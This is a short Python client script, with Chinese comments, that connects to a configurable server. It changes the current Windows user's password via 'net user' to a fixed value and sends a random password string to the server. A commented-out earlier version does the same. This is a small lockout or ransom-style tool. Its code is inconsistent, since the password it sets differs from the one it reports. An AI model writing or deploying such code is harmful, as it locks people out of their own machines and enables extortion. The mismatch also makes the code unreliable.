#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2019/3/15 16:37
# @Author  : journal
# @File    : client.py
# @Software: PyCharm

import socket
import getpass
import string
import subprocess
import random

#
# cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 创建socket实例
# cli.connect(('127.0.0.1', 55555))  # 连接server端IP地址/端口按你自己实际情况来
# user = getpass.getuser()  # 获取计算机用户名
# # 生成a-zA-Z0-9的随机密码
# letters = string.ascii_letters + string.digits
# psd = ''.join([random.choice(letters) for _ in range(8)])
# psd = '1qazQAZ'
#
# subprocess.Popen(['net', 'User', user, psd])  # 在本地执行(类似于cmd命令)
# cli.send(psd.encode('utf-8'))  # 将密码发送给server端
# back_msg = cli.recv(1024)
# cli.close()  # 关闭socket
# print(psd)

cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 连接server端IP地址/端口按你自己实际情况来
cli.connect(('127.0.0.1', 55555))
# 获取计算机用户名
user = getpass.getuser()
# 生成a-zA-Z0-9的随机密码
letters = string.ascii_letters + string.digits
pwd = ''.join([random.choice(letters) for _ in range(8)])
print(pwd)
# 控制windows cmd，并修改密码
subprocess.Popen(['net', 'User', user, "1qazQAZ"])
# 将密码发送给server端
cli.send(pwd.encode('utf-8'))
back_msg = cli.recv(1024)
# 关闭socket
cli.close()
